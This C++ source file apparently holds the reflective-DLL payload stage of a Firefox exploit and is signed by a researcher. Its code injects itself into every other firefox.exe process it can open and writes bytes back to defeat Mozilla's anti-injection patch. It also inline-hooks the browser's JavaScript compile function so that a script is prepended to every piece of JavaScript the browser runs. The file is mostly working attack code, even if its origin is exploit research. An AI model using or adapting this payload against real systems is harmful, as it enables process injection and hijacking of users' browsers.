//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <stdint.h>
#include <tlhelp32.h>
#include <memory>

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern "C" HINSTANCE hAppInstance;
//===============================================================================================//

// Axel '0vercl0k' Souchet - 3 May 2019
#include "injected-script.h"

extern "C" DWORD GetReflectiveLoaderOffset(VOID *);

struct SourceText {
    wchar_t *units_;
    uint32_t length_;
    bool ownsUnit_;
};

static_assert(sizeof(SourceText) == 0x10, "Size should be matching sizeof(xul!JS::SourceText<char16_t>).");

using je_malloc_t = wchar_t* (*)(const size_t Size);
using je_free_t = void (*)(wchar_t*);

extern "C" uint64_t trampoline_data_address_hooked;
extern "C" uint64_t trampoline_data_address_original;
extern "C" void trampoline_begin();
extern "C" void trampoline_end();
extern "C" void trampoline_savedoffbytes_space_start();
extern "C" void trampoline_savedoffbytes_space_end();

LPVOID Page(const uint8_t *Address) {
    return LPVOID(uintptr_t(Address) & 0xfffffffffffff000);
}

class ScopedVirtualProtect {
public:
    explicit ScopedVirtualProtect(
        uint8_t *Address,
        const DWORD Properties
    ) : m_BaseAddress(Page(Address)), m_OldProtect(0) {
        VirtualProtect(m_BaseAddress, kPageSize, Properties, &m_OldProtect);
    }

    ~ScopedVirtualProtect() {
        VirtualProtect(m_BaseAddress, kPageSize, m_OldProtect, &m_OldProtect);
    }

private:
    const size_t kPageSize = 0x1000;
    const LPVOID m_BaseAddress;
    DWORD m_OldProtect;
};

void ExecutionContext_Compile(
    const uintptr_t This,
    const uintptr_t CompileOpts,
    SourceText *Buffer
) {

    //
    // Retrieve the alloc / free functions.
    //

    static je_malloc_t je_malloc = nullptr;
    static je_free_t je_free = nullptr;

    if(je_malloc == nullptr) {
        const HMODULE Mozglue = GetModuleHandleA("mozglue.dll");
        je_malloc = je_malloc_t(GetProcAddress(
            Mozglue,
            "malloc"
        ));
        je_free = je_free_t(GetProcAddress(
            Mozglue,
            "free"
        ));
    }

    //
    // This is the script injected and prepended at every call.
    //

    const size_t InjectedLength = wcslen(Injected);
    const size_t NewBufferSizeBytes = (Buffer->length_ + InjectedLength + 1) * sizeof(wchar_t);

    wchar_t *NewBuffer = (wchar_t*)je_malloc(NewBufferSizeBytes);

    memcpy(NewBuffer, Injected, InjectedLength * sizeof(wchar_t));
    memcpy(NewBuffer + InjectedLength, Buffer->units_, Buffer->length_ * sizeof(wchar_t));
    NewBuffer[InjectedLength + Buffer->length_] = 0;

    //
    // Free the old buffer if it owned it.
    //

    if(Buffer->ownsUnit_) {
        je_free(Buffer->units_);
    }

    Buffer->units_ = NewBuffer;
    Buffer->length_ = uint32_t((NewBufferSizeBytes / sizeof(wchar_t)) - 1);
}

#pragma pack(push)
#pragma pack(1)

void InjectMyself(const LPVOID ReflectiveCopy, const DWORD Pid) {

    //
    // Figure out if we can pivot into this process first.
    //

    HANDLE Process = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        Pid
    );

    if(Process == INVALID_HANDLE_VALUE) {
        return;
    }

    //
    // Grab the size of our image.
    //

    const uintptr_t Base = uintptr_t(ReflectiveCopy);
    const auto ImageDosHeader = PIMAGE_DOS_HEADER(Base);
    const auto NtHeaders = PIMAGE_NT_HEADERS(Base + ImageDosHeader->e_lfanew);
    const size_t SizeOfImage = NtHeaders->OptionalHeader.SizeOfImage;

    //
    // Allocate memory in the process.
    //

    const LPVOID BackingMemory = VirtualAllocEx(
        Process,
        nullptr,
        SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READ
    );

    //
    // Copy us over.
    //

    WriteProcessMemory(
        Process,
        BackingMemory,
        ReflectiveCopy,
        SizeOfImage,
        nullptr
    );

    //
    // Mozilla doesn't want people injecting in their process.
    //
    // 0:034> u kernel32!BaseThreadInitThunk
    // KERNEL32!BaseThreadInitThunk:
    // 00007ff8`10ac7960 49bbb05b89f6ff7f0000 mov r11,offset mozglue!patched_BaseThreadInitThunk (00007fff`f6895bb0)
    // 00007ff8`10ac796a 41ffe3          jmp     r11
    //

    const uint8_t StolenBytes[] {
        // 00007ff8`10ac7960 4883ec28 sub     rsp,28h
        0x48, 0x83, 0xec, 0x28,
        // 00007ff8`10ac7964 85c9     test    ecx,ecx
        0x85, 0xc9,
        // 00007ff8`10ac7966 7515     jne     KERNEL32!BaseThreadInitThunk+0x1d
        0x75, 0x15,
        // 00007ff8`10ac7968 498bc8   mov     rcx,r8
        0x49, 0x8b, 0xc8,
        // 00007ff8`10ac796b 488bc2   mov     rax,rdx
        0x48, 0x8b, 0xc2,
        0xff, 0x15
    };

    const LPVOID BaseThreadInitThunk = GetProcAddress(GetModuleHandleA("kernel32.dll"),
        "BaseThreadInitThunk"
    );

    WriteProcessMemory(
        Process,
        BaseThreadInitThunk,
        StolenBytes,
        16,
        nullptr
    );

    //
    // Find the loader entry-point offset.
    //

    const uintptr_t ReflectiveLoaderOffset = GetReflectiveLoaderOffset(ReflectiveCopy);

    //
    // Creates a thread on the loader now.
    //

    CreateRemoteThread(
        Process,
        nullptr,
        0,
        LPTHREAD_START_ROUTINE((uint8_t*)BackingMemory + ReflectiveLoaderOffset),
        nullptr,
        0,
        nullptr
    );

    //
    // It's over!
    //

    CloseHandle(Process);
}

void Payload(const LPVOID ReflectiveCopy) {

    //
    // Execute a different payload if we execute the exploit from js.exe and not
    // from the browser.
    //

    const uintptr_t XulBase = uintptr_t(GetModuleHandleA("xul.dll"));
    if(XulBase == 0) {

        //
        // This probably means we are exploiting js.exe, so show the user some love :).
        //

        for(size_t Idx = 0; Idx < 137; ++Idx) {
            printf("PWND");
        }

        STARTUPINFOA Si;
        memset(&Si, 0, sizeof(Si));
        Si.cb = sizeof(Si);
        PROCESS_INFORMATION Pi;

        CreateProcessA(
            nullptr,
            "calc",
            nullptr,
            nullptr,
            FALSE,
            0,
            nullptr,
            nullptr,
            &Si,
            &Pi
        );

        ExitProcess(137);
        return;
    }

    if(ReflectiveCopy != nullptr) {

        //
        // We look for other accessible process, inject the reflective dll,
        // and execute it.
        //

        HANDLE SnapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if(SnapHandle == INVALID_HANDLE_VALUE) {
            return;
        }

        PROCESSENTRY32 ProcessEntry;
        ProcessEntry.dwSize = sizeof(ProcessEntry);

        if(!Process32First(SnapHandle, &ProcessEntry)) {
            CloseHandle(SnapHandle);
            return;
        }

        //
        // Walk through the snapshot, and inject into every process we have
        // access to. Let's make sure to not inject in ourself though :).
        //

        do {
            if(_stricmp(ProcessEntry.szExeFile, "firefox.exe") != 0 ||
               GetCurrentProcessId() == ProcessEntry.th32ProcessID) {
                continue;
            }

            //
            // Time for injection!.
            //

            InjectMyself(ReflectiveCopy, ProcessEntry.th32ProcessID);
        } while(Process32Next(SnapHandle, &ProcessEntry));

        //
        // We are done with the snapshot, close it down.
        //

        CloseHandle(SnapHandle);

        //
        // Once we are done let's just take a nap :-).
        //

        while(1) {
            Sleep(10000);
        }
    }


    //
    // Initialize a bunch of constants; the hook targets:
    //   `nsresult nsJSUtils::ExecutionContext::Compile`
    //

    const uintptr_t ExecutionContext_CompileOffset = 0xfe7750;
    uint8_t *ExecutionContext_CompileAddress = (uint8_t*)(
        XulBase + ExecutionContext_CompileOffset
    );

    //
    // Let's allocate ourself a nice executable heap, as well as a landing spot for our
    // inline hook.
    //

    const uintptr_t SavedOffBytesSize = uintptr_t(
        trampoline_savedoffbytes_space_end
    ) - uintptr_t(trampoline_savedoffbytes_space_start);
    const uintptr_t TrampolineSize = uintptr_t(
        trampoline_end
    ) - uintptr_t(trampoline_begin);

    HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    uint8_t *TrampolineAddress = (uint8_t*)HeapAlloc(HeapHandle, 0, TrampolineSize);

    //
    // Fix the address of the hook function in the trampoline: the trampoline calls it.
    //

    trampoline_data_address_hooked = uintptr_t(ExecutionContext_Compile);

    //
    // Fix the address of where the trampoline has to dispatch execution back to.
    //

    trampoline_data_address_original = uintptr_t(
        ExecutionContext_CompileAddress
    ) + SavedOffBytesSize;

    //
    // Now that the trampoline is prepared, we can stage it in the memory we allocated.
    //

    memcpy(TrampolineAddress, trampoline_begin, TrampolineSize);

    //
    // Copy out a number of bytes from the entry point of the function to our trampoline.
    //

    const uintptr_t OffsetSavedOffBytes = uintptr_t(
        trampoline_savedoffbytes_space_start
    ) - uintptr_t(trampoline_begin);

    memcpy(
        TrampolineAddress + OffsetSavedOffBytes,
        LPVOID(ExecutionContext_CompileAddress),
        SavedOffBytesSize
    );

    //
    // It is time for some hooking so let's make the function writeable.
    //

    ScopedVirtualProtect Rwx(ExecutionContext_CompileAddress, PAGE_EXECUTE_READWRITE);

    //
    // Prepare a 'mov rax, imm64 / jmp rax' that is going to be placed at the entry-point
    // of the target function. This jumps right into the trampoline that we previously
    // set-up in memory.
    // This jmp is 12 bytes long :-(.
    //

    struct {
        uint8_t MovRax[2];
        uint64_t MovRaxValue;
        uint8_t JmpRax[2];
    } BranchToTrampoline;

    // mov rax, target
    BranchToTrampoline.MovRax[0] = 0x48;
    BranchToTrampoline.MovRax[1] = 0xb8;
    BranchToTrampoline.MovRaxValue = uint64_t(TrampolineAddress);
    // jmp rax
    BranchToTrampoline.JmpRax[0] = 0xff;
    BranchToTrampoline.JmpRax[1] = 0xe0;

    //
    // At this point we atomically patch the entry-point with an infinite loop so that
    // we can copy the rest of the jmp without worrying about races between threads
    // executing and us placing the hook.
    //

    const uint16_t InfiniteLoop = 0xfeeb;
    InterlockedExchange16((SHORT*)ExecutionContext_CompileAddress, InfiniteLoop);

    //
    // We can now copy the rest of the jmp. We copy past the two bytes that are now
    // the infinite loop, we'll update them atomically just below.
    //

    memcpy(
        ExecutionContext_CompileAddress + sizeof(InfiniteLoop),
        &BranchToTrampoline.MovRaxValue,
        sizeof(BranchToTrampoline) - 2
    );

    //
    // At this point everything is ready, so we can atomically update the entry-point
    // of the function with the proper code.
    //

    InterlockedExchange16(
        (SHORT*)ExecutionContext_CompileAddress,
        // This is a bit ugly D:.
        *(uint16_t*)BranchToTrampoline.MovRax
    );
}

#pragma pack(pop)

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID ReflectiveCopy) {
    switch(dwReason) {
        case DLL_PROCESS_ATTACH: {
            hAppInstance = hinstDLL;
            Payload(ReflectiveCopy);
            break;
        }
    }

    return FALSE;
}

